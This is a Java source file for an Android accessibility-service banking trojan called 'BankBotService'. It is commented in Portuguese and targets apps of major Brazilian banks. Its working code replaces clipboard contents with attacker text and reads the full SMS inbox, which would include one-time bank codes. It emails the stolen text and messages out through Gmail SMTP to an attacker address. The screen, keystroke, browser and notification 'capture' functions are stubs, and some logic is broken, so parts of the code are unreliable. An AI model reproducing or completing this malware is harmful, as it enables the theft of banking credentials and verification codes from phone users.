import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;

import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class BankBotService extends AccessibilityService {

    private static final String TAG = "BankBotService";
    private static final String EMAIL = "seu_email@gmail.com";
    private static final String SENHA = "sua_senha";
    private static final String DESTINATARIO_EMAIL = "email_destinatario@gmail.com";
    private static final String TEXTO_SUBSTITUTO = "Texto substituto pelo atacante";
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1001;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            CharSequence selectedText = event.getText().toString();
            if (selectedText != null && !selectedText.toString().isEmpty()) {
                String appName = getAppName(event.getPackageName().toString());
                if (isBankApp(appName)) {
                    replaceCopiedText(selectedText.toString());
                    sendEmail(selectedText.toString(), appName);
                    captureAndSendSMS();
                    captureScreen();
                    captureKeyboardInput();
                    captureBrowserData();
                    captureNotifications();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "BankBot interrompido.");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "BankBot conectado.");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "BankBot destruído.");
    }

    private String getAppName(String packageName) {
        PackageManager packageManager = getApplicationContext().getPackageManager();
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            return (String) packageManager.getApplicationLabel(applicationInfo);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "Erro ao obter nome do aplicativo: " + e.getMessage());
        }
        return "";
    }

    private boolean isBankApp(String appName) {
        return appName.toLowerCase().contains("Banco do Brasil")
                || appName.toLowerCase().contains("Itaú")
                || appName.toLowerCase().contains("Bradesco")
                || appName.toLowerCase().contains("Caixa")
                || appName.toLowerCase().contains("Santander");
    }

    private void replaceCopiedText(String selectedText) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("label", TEXTO_SUBSTITUTO);
        clipboard.setPrimaryClip(clip);
    }

    private void sendEmail(final String content, final String appName) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");

                Session session = Session.getInstance(props,
                        new Authenticator() {
                            @Override
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(EMAIL, SENHA);
                            }
                        });

                try {
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(EMAIL));
                    message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(DESTINATARIO_EMAIL));
                    message.setSubject("Logs do BankBot");
                    message.setText("Texto copiado do " + appName + ":\n" + content);

                    Transport.send(message);
                    Log.d(TAG, "E-mail enviado com sucesso.");
                } catch (MessagingException e) {
                    Log.e(TAG, "Erro ao enviar e-mail: " + e.getMessage());
                }
            }
        }).start();
    }

    private void captureAndSendSMS() {
        SmsManager smsManager = SmsManager.getDefault();
        StringBuilder smsBuilder = new StringBuilder();

        // Capturar os SMS recebidos
        // Obtém a URI do conteúdo de mensagens recebidas
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, null, null, null, null);

        // Itera sobre os resultados do cursor
        if (cursor != null && cursor.moveToFirst()) {
            do {
                // Obtém o endereço do remetente e o corpo da mensagem
                String smsAddress = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String smsBody = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));

                // Adiciona o SMS capturado ao StringBuilder
                smsBuilder.append("From: ").append(smsAddress).append("\n").append("Message: ").append(smsBody).append("\n\n");
            } while (cursor.moveToNext());

            // Fecha o cursor
            cursor.close();
        }

        // Enviar os SMS capturados por e-mail
        String smsContent = smsBuilder.toString();
        if (!smsContent.isEmpty()) {
            sendEmail(smsContent, "SMS Capturados");
        }
    }

    private void captureScreen() {
        // Implemente a captura de tela aqui
        // Esta função captura a tela atual do dispositivo
        // Salve a captura de tela em algum lugar
        Log.d(TAG, "Captura de tela realizada");
        // Iniciar a captura de tela
        startActivityForResult(new Intent(getApplicationContext(), ScreenCaptureActivity.class), SCREEN_CAPTURE_REQUEST_CODE);
    }

    private void captureKeyboardInput() {
        // Implemente a captura de entradas de teclado aqui
        // Esta função captura entradas de teclado, como senhas
        // Registre as entradas de teclado em algum lugar seguro
        Log.d(TAG, "Captura de entrada de teclado realizada");
        // Registrar um TextWatcher para capturar as entradas de teclado em campos de texto
        EditText editText = new EditText(getApplicationContext());
        editText.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
                // Antes da mudança do texto
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                // Durante a mudança do texto
                // Registrar o texto digitado
            }

            @Override
            public void afterTextChanged(Editable s) {
                // Depois da mudança do texto
            }
        });
    }

    private void captureBrowserData() {
        // Implemente a captura de dados do navegador aqui
        // Esta função captura informações de navegação, como URLs visitadas
        // Envie os dados do navegador por e-mail ou salve em algum lugar
        Log.d(TAG, "Captura de dados do navegador realizada");
        // Código de captura de dados do navegador
        // Por exemplo:
        WebView webView = new WebView(getApplicationContext());
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Registre a URL visitada
            }
        });
        webView.loadUrl("https://www.example.com");
    }

    private void captureNotifications() {
        // Implemente a captura de notificações aqui
        // Esta função captura notificações do dispositivo
        // Envie as notificações por e-mail ou salve em algum lugar
        Log.d(TAG, "Captura de notificações realizada");
        // Código de captura de notificações
        // Por exemplo:
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());
        NotificationChannel notificationChannel = new NotificationChannel("channel_id", "Channel Name", NotificationManager.IMPORTANCE_DEFAULT);
        notificationManager.createNotificationChannel(notificationChannel);
        Notification notification = new NotificationCompat.Builder(getApplicationContext(), "channel_id")
                .setContentTitle("Title")
                .setContentText("Content")
                .setSmallIcon(R.drawable.ic_notification)
                .build();
        notificationManager.notify(1, notification);
    }
}
